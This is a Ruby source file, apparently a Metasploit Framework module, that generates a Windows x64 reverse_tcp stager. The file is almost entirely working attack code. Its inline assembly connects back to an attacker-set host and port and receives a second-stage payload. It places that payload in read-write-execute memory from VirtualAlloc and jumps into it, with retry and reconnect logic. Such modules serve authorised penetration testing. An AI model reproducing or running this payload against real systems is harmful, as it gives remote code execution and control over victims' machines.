# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/x64/send_uuid'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'

module Msf

###
#
# Complex reverse_tcp payload generation for Windows ARCH_X64
#
###

module Payload::Windows::ReverseTcp_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64

  #
  # Register reverse_tcp specific options
  #
  def initialize(*args)
    super
  end

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def include_send_pingback
    false
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    combined_asm = %Q^
      cld                     ; Clear the direction flag.
      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned 
      call start              ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp               ; block API pointer
      #{asm_reverse_tcp(opts)}
    ^
    if include_send_pingback
      puts("include_send_pingback is true")
    else
      puts("include_send_pingback is false")
      combined_asm << asm_block_recv(opts)
    end
    if opts[:exitfunk]
      combined_asm << asm_exitfunk(opts)
    end
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK 'seh' is the worst case, that adds 15 bytes
    space += 15

    # Reliability adds bytes!
    space += 57

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_reverse_tcp(opts={})

    retry_count  = [opts[:retry_count].to_i, 1].max
    encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
    encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
    encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]

    asm = %Q^
      reverse_tcp:
      ; setup the structures we need on the stack...
        mov r14, 'ws2_32'
        push r14                ; Push the bytes 'ws2_32',0,0 onto the stack.
        mov r14, rsp            ; save pointer to the "ws2_32" string for LoadLibraryA call.
        sub rsp, #{408+8}       ; alloc sizeof( struct WSAData ) bytes for the WSAData
                                ; structure (+8 for alignment)
        mov r13, rsp            ; save pointer to the WSAData structure for WSAStartup call.
        mov r12, #{encoded_host_port}
        push r12                ; host, family AF_INET and port
        mov r12, rsp            ; save pointer to sockaddr struct for connect call

      ; perform the call to LoadLibraryA...
        mov rcx, r14            ; set the param for the library to load
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call rbp                ; LoadLibraryA( "ws2_32" )

      ; perform the call to WSAStartup...
        mov rdx, r13            ; second param is a pointer to this stuct
        push 0x0101             ;
        pop rcx                 ; set the param for the version requested
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
        call rbp                ; WSAStartup( 0x0101, &WSAData );

      ; stick the retry count on the stack and store it
        push #{retry_count}     ; retry counter
        pop r14

      create_socket:
      ; perform the call to WSASocketA...
        push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
        push rax                ; push null for reserved parameter
        xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure
        xor r8, r8              ; we do not specify a protocol
        inc rax                 ;
        mov rdx, rax            ; push SOCK_STREAM
        inc rax                 ;
        mov rcx, rax            ; push AF_INET
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
        call rbp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
        mov rdi, rax            ; save the socket for later

      try_connect:
      ; perform the call to connect...
        push 16                 ; length of the sockaddr struct
        pop r8                  ; pop off the third param
        mov rdx, r12            ; set second param to pointer to sockaddr struct
        mov rcx, rdi            ; the socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
        call rbp                ; connect( s, &sockaddr, 16 );

        test eax, eax           ; non-zero means failure
        jz connected

      handle_connect_failure:
        dec r14                 ; decrement the retry count
        jnz try_connect
    ^

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        push 0x56A2B5F0       ; hardcoded to exitprocess for size
        call rbp
      ^
    end

    asm << %Q^
      ; this  lable is required so that reconnect attempts include
      ; the UUID stuff if required.
      connected:
    ^
      
    asm << asm_send_pingback if include_send_pingback

    asm << asm_send_uuid if include_send_uuid

    asm

  end

  def asm_block_recv(opts={})

    reliable     = opts[:reliable]

    asm = %Q^
      recv:
      ; Receive the size of the incoming second stage...
        sub rsp, 16             ; alloc some space (16 bytes) on stack for to hold the
                                ; second stage length
        mov rdx, rsp            ; set pointer to this buffer
        xor r9, r9              ; flags
        push 4                  ; 
        pop r8                  ; length = sizeof( DWORD );
        mov rcx, rdi            ; the saved socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call rbp                ; recv( s, &dwLength, 4, 0 );
    ^

    if reliable
      asm << %Q^
      ; reliability: check to see if the recv worked, and reconnect
      ; if it fails
        cmp eax, 0
        jle cleanup_socket
      ^
    end

    asm << %Q^
        add rsp, 32             ; we restore RSP from the api_call so we can pop off RSI next

      ; Alloc a RWX buffer for the second stage
        pop rsi                 ; pop off the second stage length
        mov esi, esi            ; only use the lower-order 32 bits for the size
        push 0x40               ; 
        pop r9                  ; PAGE_EXECUTE_READWRITE
        push 0x1000             ; 
        pop r8                  ; MEM_COMMIT
        mov rdx, rsi            ; the newly recieved second stage length.
        xor rcx, rcx            ; NULL as we dont care where the allocation is.
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        mov rbx, rax            ; rbx = our new memory address for the new stage
        mov r15, rax            ; save the address so we can jump into it later

      read_more:                ;
        xor r9, r9              ; flags
        mov r8, rsi             ; length
        mov rdx, rbx            ; the current address into our second stages RWX buffer
        mov rcx, rdi            ; the saved socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call rbp                ; recv( s, buffer, length, 0 );
    ^

    if reliable
      asm << %Q^
      ; reliability: check to see if the recv worked, and reconnect
      ; if it fails
        cmp eax, 0
        jge read_successful

      ; something failed so free up memory
        pop rax
        push r15
        pop rcx                 ; lpAddress
        push 0x4000             ; MEM_COMMIT
        pop r8                  ; dwFreeType
        push 0                  ; 0
        pop rdx                 ; dwSize
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
        call rbp                ; VirtualFree(payload, 0, MEM_COMMIT)

      cleanup_socket:
      ; clean up the socket
        push rdi                ; socket handle
        pop rcx                 ; s (closesocket parameter)
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
        call rbp

      ; and try again
        dec r14                 ; decrement the retry count
        jmp create_socket
      ^
    end

    asm << %Q^
      read_successful:
        add rbx, rax            ; buffer += bytes_received
        sub rsi, rax            ; length -= bytes_received
        test rsi, rsi           ; test length
        jnz read_more           ; continue if we have more to read
        jmp r15                 ; return into the second stage
    ^
    asm
  end

end

end
